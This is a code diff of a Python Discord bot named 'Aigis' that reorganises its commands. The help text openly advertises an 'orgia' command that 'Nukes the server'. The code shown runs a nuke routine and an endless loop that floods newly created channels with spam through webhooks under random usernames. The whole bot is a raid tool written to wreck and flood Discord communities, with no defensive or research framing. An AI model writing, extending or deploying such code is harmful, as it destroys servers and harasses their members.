@@ -32,38 +32,6 @@ async def on_ready():
   
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id)
 
-#갠디로 엠베드 전송
-@client.command()
-async def aigis(ctx):
-  await ctx.message.delete()
-  author = ctx.author
-  cmds = discord.Embed(
-    title = "Aigis - Commands", 
-    description = """
-**__COMMANDS__**
-```
-{prefix}aigis
-Shows this message. 
- 
-{prefix}orgia
-Nukes the server. 
- 
-{prefix}overheat
-Logs out the client.
-```
-**__CREDITS__**
-```
-asdf
-```
-""")
-  await author.send(embed = cmds)
-
-#여기서부터 다음 설명까지 orgia 커맨드 범위
-async def orgia(ctx):
-  await ctx.message.delete()
-  guild = ctx.guild
-  await nuke(guild)
-  
 async def nuke(guild):
   print(f"{C.WHITE}Nuking {guild.name}.")
   role = discord.utils.get(guild.roles, name = "@everyone")
@@ -102,6 +70,38 @@ async def on_guild_channel_create(channel):
     webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
     while True:
       await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
+
+#갠디로 엠베드 전송
+@client.command()
+async def aigis(ctx):
+  await ctx.message.delete()
+  author = ctx.author
+  cmds = discord.Embed(
+    title = "Aigis - Commands", 
+    description = """
+**__COMMANDS__**
+```
+{prefix}aigis
+Shows this message. 
+ 
+{prefix}orgia
+Nukes the server. 
+ 
+{prefix}overheat
+Logs out the client.
+```
+**__CREDITS__**
+```
+asdf
+```
+""")
+  await author.send(embed = cmds)
+
+#여기서부터 다음 설명까지 orgia 커맨드 범위
+async def orgia(ctx):
+  await ctx.message.delete()
+  guild = ctx.guild
+  await nuke(guild)
 
 #서버퇴장
 async def overheat(ctx):
